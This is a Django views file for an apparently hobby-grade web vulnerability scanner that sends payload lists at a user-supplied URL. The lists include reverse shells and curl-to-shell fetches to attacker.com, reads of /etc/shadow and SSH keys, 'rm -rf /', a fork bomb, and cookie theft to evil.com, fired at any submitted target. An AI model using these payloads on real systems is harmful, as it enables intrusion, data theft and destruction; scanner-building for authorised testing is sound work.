import io, re, base64
from django.contrib.auth.models import User
import matplotlib
import matplotlib.pyplot as plt
from bs4 import BeautifulSoup
import urllib
import urllib.error
from urllib import request
import requests
from urllib.parse import quote
from django.shortcuts import render, redirect
from django.contrib.auth import login, logout, authenticate
from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from .models import ScanResult

matplotlib.use('Agg')  # ✅ Non-GUI mode


# noinspection PyPep8Naming
class HTTP_HEADER:
    HOST = "Host"
    SERVER = "Server"


# ✅ User Login
# def login_user(request):
#     if request.method == "POST":
#         form = AuthenticationForm(data=request.POST)
#         if form.is_valid():
#             user = form.get_user()
#             login(request, user)
#             return redirect("dashboard")
#     else:
#         form = AuthenticationForm()
#     return render(request, "login.html", {"form": form})


# ✅ User Logout
# def logout_user(request):
#     logout(request)
#     return redirect("login")


# ✅ Dashboard (Protected)
@login_required
def dashboard(request):
    scans = ScanResult.objects.filter(user=request.user)
    return render(request, "dashboard.html", {"scans": scans})


def home(request):
    if request.method == 'POST':
        if not request.POST.get('url'):
            context = {"error": "No URL found."}
            return render(request, 'home.html', context)
        else:
            url = request.POST['url']
            context = {'url': url}

            scanner(url, context, request)  # ✅ Now passing request to scanner()

            if 'error' in context.get('headers', {}):
                context['error'] = context['headers']['error']
                return render(request, 'home.html', context)
            else:
                return render(request, 'output.html', context)

    return render(request, 'home.html')


# ============================================================== #


def headers_reader(url, context):
    headers = {
        'backendTech': "Fingerprinted the Backend Technologies."
    }
    try:
        opener = urllib.request.urlopen(url)
        if opener.code == 200:
            headers['status'] = "Status Code: 200 OK"

        Host = url.split("/")[2]
        Server = opener.headers.get(HTTP_HEADER.SERVER)
        headers['host'] = "Host: " + str(Host)
        headers['server'] = "WebServer: " + str(Server)

        a = ''
        for item in opener.headers.items():
            for powered in item:
                sig = "x-powered-by"
                if sig in item:
                    a = a + "[!] " + str(powered).strip() + '\n'
        headers['powered'] = a
    except urllib.error.HTTPError as e:
        if e.code == 404:
            headers['error'] = "[!] Page was not found! Please check the URL"
        else:
            headers['error'] = ("[!] HTTP Error:", e)

    context['headers'] = headers


def main_function1(url, payloads, check):
    vuln = 0
    session = requests.Session()

    if "?" in url:
        base_url, query_params = url.split("?", 1)
    else:
        base_url = url
        query_params = ""

    for payload in payloads:
        modified_url = f"{base_url}?{query_params}{payload}" if query_params else f"{base_url}/{payload}"

        try:
            res = session.get(modified_url, timeout=5)

            if re.search(check, res.text) or payload in res.text:
                vuln += 1
                print("\n[DEBUG] Vulnerability Found!")
                print("[DEBUG] URL Tested:", modified_url)
                # print("[DEBUG] Response Content:", res.text[:500])  # Print first 500 characters

        except requests.RequestException:
            pass

    return f"[!] Found {vuln} vulnerabilities!" if vuln > 0 else "[!] Target is not vulnerable!"


def main_function2(url, payloads, check):
    """Similar to main_function1 but encodes payloads to bypass WAFs & includes header injection."""
    vuln = 0
    session = requests.Session()

    # Check if the URL has query parameters
    if "?" in url:
        base_url, query_params = url.split("?", 1)
    else:
        base_url = url
        query_params = ""

    for payload in payloads:
        encoded_payload = quote(payload)  # URL encode payload

        # Inject into query parameters
        if query_params:
            modified_url = f"{base_url}?{query_params}{encoded_payload}"
        else:
            modified_url = f"{base_url}/{encoded_payload}"

        try:
            # Send request with payloads in headers as well
            headers = {
                "User-Agent": payload,
                "Referer": payload
            }
            res = session.get(modified_url, headers=headers, timeout=5)

            # Improved detection: Check raw, encoded, and byte versions of payload
            if re.search(check, res.text) or \
                    payload in res.text or \
                    encoded_payload in res.text:
                vuln += 1
        except requests.RequestException:
            pass

    return f"[!] Found {vuln} vulnerabilities!" if vuln > 0 else "[!] Target is not vulnerable!"


sqli_payloads = [
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "' OR 'a'='a",
    "1' OR '1'='1' --",
    "1' OR 1=1 --",
    "' UNION SELECT null, null --",
    "' UNION SELECT 1,2,3 --",
    "' UNION SELECT username, password FROM users --",
    "' OR 1=CAST((SELECT @@version) AS INT) --",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "admin' --",
    "' UNION SELECT user(), database(), version() --",
    "' UNION SELECT 1, table_name FROM information_schema.tables --",
    "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users' --",
    "' UNION SELECT username, password FROM mysql.user --",
    "' OR SLEEP(5) --",
    "'; EXEC xp_cmdshell('whoami') --",
    "' OR 1=1 LIMIT 1 --",
    "' AND '1'='1",
    "1' ORDER BY 3 --",
    "1 AND 1=1 --",
    "1' AND 'x'='x' --",
    "1' AND EXISTS (SELECT * FROM users) --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' OR (SELECT COUNT(*) FROM users) > 0 --"
]

xss_payloads = [
    "<script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "'><script>alert('XSS')</script>",
    "\"><img src=x onerror=alert('XSS')>",
    # "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<iframe src=javascript:alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<img src=1 href=1 onerror='javascript:alert(1)'>",
    "<script>alert(document.cookie)</script>",
    "<script>document.write('<img src=x onerror=alert(1)>')</script>",
    "<script>eval('alert(1)')</script>",
    "<script>setTimeout('alert(1)',1000)</script>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<input type=text onfocus=alert(1) autofocus>",
    "javascript:alert(1)//",
    "';alert(1);//",
    "<script>window.onerror=alert;throw 'XSS'</script>",
    "<form><button formaction='javascript:alert(1)'>Click me</button></form>",
    "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
]

js_payloads = [
    "'; alert('JS Injection'); //",
    "\"); alert('JS Injection'); //",
    "\"> alert('JS Injection'); //",
    "'; console.log('Injected JS'); //",
    "\"); console.log('Injected JS'); //",
    "'-alert(document.domain)-'",
    "\");eval(String.fromCharCode(97,108,101,114,116,40,39,74,83,32,73,110,106,101,99,116,101,100,39,41))",
    "'; fetch('https://evil.com?steal='+document.cookie); //",
    "\"><script>alert('Injected JS')</script>",
    "';window.location='https://evil.com'; //",
    "\";document.write('<script>alert(1)</script>'); //",
    "';document.body.innerHTML='<h1>Hacked</h1>'; //"
]

rce_payloads = [
    # ";id",
    "& whoami",
    # "`id`",
    "`whoami`",
    "; uname -a",
    "; cat /etc/passwd",
    "; cat /etc/shadow",
    "; cat ~/.ssh/id_rsa",
    ";& ls -la",
    ";& ps aux",
    "'; echo vulnerable; #",
    "'; nc -e /bin/sh attacker.com 4444; #",
    "'; curl http://attacker.com/shell.sh | sh; #",
    "'; wget http://attacker.com/shell.sh -O- | sh; #",
    "'; bash -i >& /dev/tcp/attacker.com/4444 0>&1; #",
    "'; python -c 'import os; os.system(\"/bin/sh\")'; #",
    "'; php -r 'shell_exec(\"/bin/sh\")'; #",
    "'; rm -rf /; #",
    "'; fork bomb:(){ :|:& };: #"
]


def xss_func(url, context):
    check = re.compile(r"alert\(|XSS", re.I)
    context['xss'] = main_function1(url, xss_payloads, check)


def error_based_sqli_func(url, context):
    check = re.compile(r"SQL syntax|mysql_fetch|ODBC|Microsoft SQL Server", re.I)
    context['sqli'] = main_function1(url, sqli_payloads, check)


def js_injection_func(url, context):
    check = re.compile(r"alert\(|JS Injection", re.I)
    context['js'] = main_function1(url, js_payloads, check)


def rce_func(url, context):
    check = re.compile(r"root:x|uid=|Linux|Volume Serial", re.I)
    context['rce'] = main_function1(url, rce_payloads, check)


def extract_vulnerability_count(text):
    """Extracts the number of vulnerabilities from the scan result text."""
    if not text:
        return 0

    # ✅ Match "Found X vulnerabilities"
    match = re.search(r"Found (\d+) vulnerabilities", text)
    if match:
        return int(match.group(1))

    # ✅ Special case for Form Vulnerabilities (check for explicit detection)
    return 1 if "Found" in text and "vulnerabilities" in text else 0


def scanner(url, context, request, user=None):
    """Runs all vulnerability scans on the target URL and saves results in the session."""

    headers_reader(url, context)

    if 'error' not in context['headers']:
        xss_func(url, context)
        error_based_sqli_func(url, context)
        js_injection_func(url, context)
        rce_func(url, context)

        # ✅ Ensure form vulnerability testing is performed
        check_pattern = re.compile(r"(alert\(|syntax error|SQL Server|Fatal error|injection)", re.I)
        test_form_vulnerabilities(url, context, check_pattern)

        if user:  # ✅ Save scan only if user is logged in
            ScanResult.objects.create(
                user=user,
                url=url,
                xss=context.get("xss", ""),
                sqli=context.get("sqli", ""),
                js=context.get("js", ""),
                rce=context.get("rce", ""),
                form_vuln=context.get("form_vuln", "")
            ).save()

    # ✅ Debug: Print scan results before saving to session
    print("DEBUG - Scan Results:", context)

    # ✅ Store results in Django session
    request.session['scan_results'] = {
        "xss": context.get("xss", ""),
        "sqli": context.get("sqli", ""),
        "js": context.get("js", ""),
        "rce": context.get("rce", ""),
        "form_vuln": context.get("form_vuln", "")
    }
    request.session.modified = True  # ✅ Ensure session updates

    # ✅ Debug: Print session data after saving
    print("DEBUG - Saved Session Data:", request.session.get("scan_results", {}))


@login_required
def report(request):
    """Generate a graphical and textual vulnerability report."""

    # Retrieve scan results from session
    scan_results = request.session.get("scan_results", {})

    # ✅ Extract actual counts
    vulnerabilities = {
        "XSS": extract_vulnerability_count(scan_results.get("xss", "")),
        "SQL_Injection": extract_vulnerability_count(scan_results.get("sqli", "")),
        "JavaScript_Injection": extract_vulnerability_count(scan_results.get("js", "")),
        "Remote_Code_Execution": extract_vulnerability_count(scan_results.get("rce", "")),
        "Form_Vulnerabilities": extract_vulnerability_count(scan_results.get("form_vuln", ""))
    }

    # ✅ Debug: Print extracted values
    print("DEBUG - Extracted Vulnerability Counts:", vulnerabilities)

    # ✅ Generate the Matplotlib bar chart
    plt.figure(figsize=(8, 4))
    plt.bar(vulnerabilities.keys(), vulnerabilities.values(), color='blue')
    plt.xlabel('Vulnerability Type')
    plt.ylabel('Number of Issues Found')
    plt.title('Vulnerability Scan Report')

    plt.xticks(rotation=30, ha="right")  # Rotates labels by 30 degrees, aligns them to the right

    # ✅ Save the plot to a BytesIO object
    buf = io.BytesIO()
    plt.savefig(buf, format='png', bbox_inches="tight")
    plt.close()
    buf.seek(0)

    # ✅ Convert to base64 for HTML display
    chart_image = base64.b64encode(buf.read()).decode('utf-8')
    buf.close()

    return render(request, 'report.html', {
        'chart_image': chart_image,
        'vulnerabilities': vulnerabilities  # ✅ Pass extracted counts
    })


def test_form_vulnerabilities(url, context, check):
    """Detects form vulnerabilities by injecting payloads into form fields."""
    session = requests.Session()
    try:
        res = session.get(url, timeout=5)
        if res.status_code != 200:
            context['form_vuln'] = "[!] Could not reach the target!"
            return

        soup = BeautifulSoup(res.text, "html.parser")
        forms = soup.find_all("form")

        if not forms:
            context['form_vuln'] = "[!] No forms detected!"
            return

        payload = "<script>alert('XSS-DETECTED-123')</script>"
        vuln_count = 0

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            form_url = url if not action else requests.compat.urljoin(url, action)

            inputs = form.find_all(["input", "textarea", "select"])
            data = {input_field.get("name"): payload for input_field in inputs if input_field.get("name")}

            res = session.post(form_url, data=data) if method == "post" else session.get(form_url, params=data)

            # ✅ Use `check` regex pattern to verify execution
            if re.search(check, res.text):
                vuln_count += 1

        context[
            'form_vuln'] = f"[!] Found {vuln_count} form vulnerabilities!" if vuln_count > 0 else "[!] No form vulnerabilities found!"

    except Exception as e:
        context['form_vuln'] = f"[!] Error while scanning forms: {str(e)}"


def register_user(request):
    if request.method == "POST":
        username = request.POST["username"]
        email = request.POST["email"]
        password1 = request.POST["password1"]
        password2 = request.POST["password2"]

        if password1 != password2:
            messages.error(request, "Passwords do not match.")
            return redirect("register")

        if User.objects.filter(username=username).exists():
            messages.error(request, "Username already taken.")
            return redirect("register")

        user = User.objects.create_user(username=username, email=email, password=password1)
        user.save()
        messages.success(request, "Registration successful! Please log in.")
        return redirect("login")

    return render(request, "register.html")


# ✅ Login View
def login_user(request):
    if request.method == "POST":
        username = request.POST["username"]
        password = request.POST["password"]
        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            messages.success(request, "Login successful!")
            return redirect("dashboard")  # Redirect to dashboard after login
        else:
            messages.error(request, "Invalid username or password.")
            return redirect("login")

    return render(request, "login.html")


# ✅ Logout View
def logout_user(request):
    logout(request)
    messages.success(request, "You have been logged out.")
    return redirect("login")


# ✅ Dashboard View (Requires Login)
@login_required
def dashboard(request):
    return render(request, "dashboard.html")


# ✅ About Page (Landing Page)
def about(request):
    return render(request, "about.html")  # Make sure about.html exists in templates
